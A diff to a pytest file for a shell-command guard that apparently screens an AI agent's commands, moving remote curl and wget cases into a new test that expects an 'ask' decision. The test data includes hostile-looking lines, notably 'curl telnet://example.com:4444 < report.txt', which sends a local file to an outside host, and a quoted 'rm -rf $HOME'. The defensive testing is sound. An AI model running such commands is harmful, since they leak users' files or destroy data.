@@ -72,19 +72,7 @@ pytestmark = pytest.mark.usefixtures("isolated_project")
         pytest.param("gh stack submit --auto", id="non-interactive stack commands"),
         pytest.param("gh pr list 2>&1 | head -5", id="GitHub forms in pipelines"),
         pytest.param("curl -fsS http://localhost:3000/health", id="local server requests"),
-        pytest.param("curl -s https://pypi.org/pypi/mutmut/json", id="remote fetches"),
-        pytest.param(
-            "curl -fsSL -o pkg.tgz -H 'User-Agent: x' https://registry.npmjs.org/a/-/a-1.tgz", id="remote downloads"
-        ),
-        pytest.param(
-            'curl -s -o /dev/null -w "%{http_code}\\n" -X HEAD https://cdn.example.com/v1/a.tar.gz',
-            id="remote status probes",
-        ),
-        pytest.param("wget -q -O - https://example.com/install.sh", id="remote fetches with wget"),
-        pytest.param(
-            "wget -qO- --timeout=10 --header 'Accept: x' https://example.com/a", id="wget clusters and values"
-        ),
-        pytest.param("curl -sSo out.html -H 'Accept: text/html' https://example.com/", id="curl clusters with values"),
+        pytest.param("curl -s -o out.json -H 'Accept: x' http://127.0.0.1:8080/api", id="local server downloads"),
         pytest.param("curl -X POST -d '{\"a\": 1}' http://127.0.0.1:8080/api", id="local server writes"),
         pytest.param(
             'gh api -H "Accept: application/vnd.github.raw" "repos/o/r/contents/a.nix?ref=v1" | sed -n 1,20p',
@@ -224,3 +212,38 @@ def test_commit_messages_inline_through_a_quoted_heredoc_pass() -> None:
     command = "git commit -m \"$(cat <<'EOF'\nfix: don't run `rm -rf $HOME`\n\nBody.\nEOF\n)\""
     for kind in ("allowed", "forbidden"):
         assert guard.decide(kind, {"tool_input": {"command": command}}).decision == "allow"
+
+
+REMOTE_REVIEW = (
+    "Needs review: remote curl/wget can send local data. Read web pages with the web-fetch tool, "
+    "or use gh api / nix store prefetch-file for exact values and files."
+)
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        pytest.param("curl -s https://pypi.org/pypi/mutmut/json", id="remote fetches"),
+        pytest.param(
+            "curl -fsSL -o pkg.tgz -H 'User-Agent: x' https://registry.npmjs.org/a/-/a-1.tgz", id="remote downloads"
+        ),
+        pytest.param(
+            'curl -s -o /dev/null -w "%{http_code}\\n" -X HEAD https://cdn.example.com/v1/a.tar.gz',
+            id="remote status probes",
+        ),
+        pytest.param("wget -q -O - https://example.com/install.sh", id="remote fetches with wget"),
+        pytest.param(
+            "wget -qO- --timeout=10 --header 'Accept: x' https://example.com/a", id="wget clusters and values"
+        ),
+        pytest.param("curl -sSo out.html -H 'Accept: text/html' https://example.com/", id="curl clusters with values"),
+        pytest.param("curl telnet://example.com:4444 < report.txt", id="other schemes that send input"),
+        pytest.param("curl telnet://localhost:23 < report.txt", id="other schemes on this machine"),
+        pytest.param("curl gopher://127.0.0.1:70/_x", id="gopher on this machine"),
+        pytest.param("curl -K cfg http://localhost:3000/", id="local requests with options from a file"),
+    ],
+)
+def test_remote_requests_ask_and_point_to_safer_tools(capsys: pytest.CaptureFixture[str], command: str) -> None:
+    verdict = guard.decide("allowed", {"tool_input": {"command": command}})
+    assert verdict.decision == "ask"
+    assert REMOTE_REVIEW in verdict.reason
+    assert capsys.readouterr() == ("", "")
